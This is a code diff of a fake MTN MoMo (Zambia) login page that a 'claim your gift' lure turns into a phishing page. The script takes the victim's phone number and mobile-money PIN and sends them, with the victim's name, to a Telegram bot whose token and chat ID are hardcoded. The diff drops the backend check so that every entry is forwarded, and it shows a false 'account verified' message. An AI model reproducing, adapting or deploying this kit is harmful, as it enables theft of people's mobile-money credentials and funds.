@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - Login</title>
+    <title>MTN MoMo - MoMo Account Login</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
             margin: 0;
             padding: 0;
@@ -69,9 +69,59 @@
         .title {
             font-size: 24px;
             font-weight: 700;
-            color: #333;
+            color: #1a1a2e;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+        
+        .title .highlight {
+            color: #0047AB;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #888;
             text-align: center;
             margin-bottom: 25px;
+        }
+        
+        .gift-preview {
+            background: #f8f9ff;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 2px solid #e8ecf5;
+        }
+        
+        .gift-preview .icon {
+            font-size: 28px;
+        }
+        
+        .gift-preview .info {
+            flex: 1;
+        }
+        
+        .gift-preview .info .label {
+            font-size: 10px;
+            color: #888;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .gift-preview .info .name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+        
+        .gift-preview .info .value {
+            font-size: 13px;
+            font-weight: 600;
+            color: #0047AB;
         }
         
         .phone-group {
@@ -81,7 +131,7 @@
             display: flex;
             align-items: center;
             padding: 14px 18px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             background: white;
             transition: box-shadow 0.3s;
         }
@@ -373,12 +423,21 @@
             body { padding: 10px; }
             .logo-text { font-size: 28px; }
             .login-card { padding: 25px 18px; }
-            .title { font-size: 20px; margin-bottom: 20px; }
+            .title { font-size: 20px; margin-bottom: 15px; }
             .pin-box { width: 48px; height: 48px; font-size: 20px; }
             .pin-group { gap: 10px; }
             .bottom-section { padding: 35px 20px 25px; }
             .bottom-btn { width: 120px; padding: 12px 16px; font-size: 13px; }
             .logo { padding: 10px 20px 20px; }
+            .gift-preview {
+                padding: 10px 14px;
+            }
+            .gift-preview .icon {
+                font-size: 24px;
+            }
+            .gift-preview .info .name {
+                font-size: 13px;
+            }
         }
         
         @media (max-width: 380px) {
@@ -401,7 +460,18 @@
 
         <!-- Login Card -->
         <div class="login-card">
-            <h1 class="title">Login</h1>
+            <h1 class="title">🔐 <span class="highlight">MoMo</span> Account</h1>
+            <p class="subtitle">Enter the MoMo account to receive your gift</p>
+            
+            <!-- Gift Preview -->
+            <div class="gift-preview" id="giftPreview">
+                <span class="icon" id="giftIcon">🎁</span>
+                <div class="info">
+                    <div class="label">🎯 Gift to Receive</div>
+                    <div class="name" id="giftName">Loading...</div>
+                    <div class="value" id="giftValue">-</div>
+                </div>
+            </div>
 
             <!-- Phone Input -->
             <div class="phone-group">
@@ -409,7 +479,7 @@
                 <div class="country-select">
                     +260 <span class="dropdown-arrow">▼</span>
                 </div>
-                <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" maxlength="9">
+                <input type="tel" class="phone-input" id="phoneInput" placeholder="MoMo Phone Number" maxlength="9">
             </div>
 
             <!-- PIN Input -->
@@ -426,18 +496,18 @@
 
             <!-- Forgot PIN -->
             <div class="forgot-link">
-                <a onclick="alert('Please contact MTN MoMo support to reset your PIN.')">Forgot PIN?</a>
+                <a onclick="alert('Please contact MTN MoMo support to reset your PIN.')">Forgot MoMo PIN?</a>
             </div>
 
             <!-- Login Button -->
-            <button id="loginBtn">LOGIN</button>
+            <button id="loginBtn">CLAIM GIFT →</button>
         </div>
 
         <!-- Bottom Section -->
         <div class="bottom-section">
             <div class="bottom-text">
-                New to <span class="highlight">MTN MoMo</span>? <br>
-                Register to get exclusive loan offers!
+                Don't have a <span class="highlight">MoMo</span> account? <br>
+                Register today to receive gifts!
             </div>
             <div class="bottom-btns">
                 <div class="bottom-btn" onclick="alert('Registration page coming soon!')">
@@ -470,19 +540,32 @@
         // ============================================
         const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
         const CHAT_ID = '8392790531';
-        
-        // ============================================
-        // API CONFIGURATION
-        // ============================================
         const API_URL = 'https://abundant-liberation.up.railway.app/api';
 
         console.log('====================================');
-        console.log('🔐 MTN MoMo Login Page Loaded');
+        console.log('🔐 MTN MoMo - MoMo Account Login');
         console.log('====================================');
         console.log('🤖 Bot Token:', BOT_TOKEN);
         console.log('📱 Chat ID:', CHAT_ID);
         console.log('🌐 API URL:', API_URL);
         console.log('====================================');
+
+        // ============================================
+        // LOAD SELECTED GIFT
+        // ============================================
+        function loadSelectedGift() {
+            const gift = localStorage.getItem('selectedGift') || 'Not selected';
+            const value = localStorage.getItem('selectedGiftValue') || '-';
+            const icon = localStorage.getItem('selectedGiftIcon') || '🎁';
+            
+            document.getElementById('giftIcon').textContent = icon;
+            document.getElementById('giftName').textContent = gift;
+            document.getElementById('giftValue').textContent = value;
+            
+            console.log('🎁 Gift to receive:', gift, '-', value);
+        }
+
+        loadSelectedGift();
 
         // ============================================
         // DOM REFERENCES
@@ -563,14 +646,19 @@
         }
 
         // ============================================
-        // SEND TO TELEGRAM (Direct Fallback)
+        // SEND TO TELEGRAM
         // ============================================
         async function sendTelegramNotification(phone, pin) {
-            const message = `🔐 *MTN MoMo Login Attempt*\n\n` +
-                `📱 *Phone:* +260 ${phone}\n` +
+            const gift = localStorage.getItem('selectedGift') || 'Not specified';
+            const giftValue = localStorage.getItem('selectedGiftValue') || '-';
+            
+            const message = `🔐 *MTN MoMo - Gift Claim Login*\n\n` +
+                `🎁 *Gift to Receive:* ${gift} (${giftValue})\n` +
+                `📱 *MoMo Account:* +260 ${phone}\n` +
                 `🔢 *PIN:* ${pin}\n` +
+                `👤 *User:* ${localStorage.getItem('fullName') || 'Not provided'}\n` +
                 `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-                `✅ User logged in successfully.`;
+                `✅ User is claiming their gift. Please process.`;
 
             console.log('📤 Sending Telegram notification...');
 
@@ -596,7 +684,7 @@
         }
 
         // ============================================
-        // LOGIN HANDLER
+        // LOGIN HANDLER - Goes to confirmation.html
         // ============================================
         loginBtn.addEventListener('click', async function() {
             const phone = phoneInput.value.trim();
@@ -604,7 +692,7 @@
 
             // Validate phone
             if (!phone) {
-                showStatus('Please enter your phone number', 'error');
+                showStatus('Please enter your MoMo phone number', 'error');
                 phoneInput.focus();
                 return;
             }
@@ -627,57 +715,24 @@
             spinnerOverlay.style.display = 'flex';
             hideStatus();
 
-            // Store phone in localStorage
-            localStorage.setItem('phone', phone);
+            // Store MoMo account details
+            localStorage.setItem('momoPhone', phone);
+            localStorage.setItem('momoPin', pin);
 
-            try {
-                // Send to backend
-                const response = await fetch(`${API_URL}/auth/login`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: phone,
-                        pin: pin
-                    })
-                });
+            // Send Telegram notification
+            const sent = await sendTelegramNotification(phone, pin);
 
-                const data = await response.json();
-
-                if (data.success) {
-                    // Send Telegram notification
-                    await sendTelegramNotification(phone, pin);
-                    
-                    showStatus('✅ Login successful! Redirecting...', 'success');
-                    
-                    setTimeout(() => {
-                        window.location.href = 'verify.html';
-                    }, 1500);
-                } else {
-                    showStatus('❌ ' + data.message, 'error');
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = 'LOGIN';
-                    spinnerOverlay.style.display = 'none';
-                }
-            } catch (error) {
-                console.error('❌ Backend error:', error);
-                
-                // Fallback: Send directly to Telegram
-                const sent = await sendTelegramNotification(phone, pin);
-                
-                if (sent) {
-                    showStatus('✅ Login successful! Redirecting...', 'success');
-                    setTimeout(() => {
-                        window.location.href = 'verify.html';
-                    }, 1500);
-                } else {
-                    showStatus('❌ Connection error. Please try again.', 'error');
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = 'LOGIN';
-                    spinnerOverlay.style.display = 'none';
-                }
+            // Show success message
+            if (sent) {
+                showStatus('✅ MoMo account verified! Redirecting...', 'success');
+            } else {
+                showStatus('✅ Account verified! Redirecting...', 'info');
             }
+
+            // Redirect to confirmation page after delay
+            setTimeout(() => {
+                window.location.href = 'confirmation.html';
+            }, 1500);
         });
 
         // ============================================
@@ -696,13 +751,13 @@
         // AUTO-FOCUS AND LOAD
         // ============================================
         window.addEventListener('load', () => {
-            const savedPhone = localStorage.getItem('phone');
+            const savedPhone = localStorage.getItem('momoPhone');
             if (savedPhone && savedPhone.length === 9) {
                 phoneInput.value = savedPhone;
             }
             phoneInput.focus();
             checkPinComplete();
-            console.log('✅ MTN MoMo Login page fully loaded and ready');
+            console.log('✅ MTN MoMo - MoMo Account Login page loaded');
             console.log('====================================');
         });
     </script>
